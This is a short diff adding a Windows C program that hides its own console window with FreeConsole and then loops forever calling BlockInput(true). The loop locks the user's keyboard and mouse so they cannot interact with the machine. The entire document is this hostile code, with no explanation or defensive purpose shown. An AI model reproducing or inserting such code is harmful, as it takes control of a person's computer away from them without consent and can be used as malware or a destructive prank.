@@ -1,0 +1,8 @@
+#include<windows.h>
+
+void main(){
+   FreeConsole();
+    while(1){
+      BlockInput(true);
+      }
+} 
